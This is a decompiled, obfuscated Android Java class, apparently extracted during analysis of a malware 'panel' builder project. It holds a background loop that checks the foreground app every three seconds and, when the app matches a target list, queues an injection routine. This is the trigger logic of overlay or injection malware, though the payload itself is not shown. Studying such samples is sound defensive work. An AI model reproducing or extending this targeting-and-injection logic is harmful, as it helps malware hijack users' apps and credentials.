package v.s;

import app.mobilex.plus.services.DataQFAdapter;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class Anxqm3NelDGirLH5 implements Runnable {
    public final /* synthetic */ DataQFAdapter w9sT1Swbhx3hs;

    public Anxqm3NelDGirLH5(DataQFAdapter dataQFAdapter) {
        this.w9sT1Swbhx3hs = dataQFAdapter;
    }

    @Override // java.lang.Runnable
    public final void run() {
        String foregroundPackage;
        try {
            if (oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM()) {
                String str = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                if (GQh1bKoqkKhujFH2nJ.JXn4Qf7zpnLjP5 && (foregroundPackage = this.w9sT1Swbhx3hs.getForegroundPackage()) != null && GQh1bKoqkKhujFH2nJ.w9sT1Swbhx3hs(foregroundPackage)) {
                    this.w9sT1Swbhx3hs.pendingInjectPkg = foregroundPackage;
                    this.w9sT1Swbhx3hs.handler.removeCallbacks(this.w9sT1Swbhx3hs.injectRunnable);
                    DataQFAdapter dataQFAdapter = this.w9sT1Swbhx3hs;
                    dataQFAdapter.safePost(dataQFAdapter.injectRunnable);
                }
            }
        } catch (Throwable unused) {
        }
        this.w9sT1Swbhx3hs.safePostDelayed(this, 3000L);
    }
}
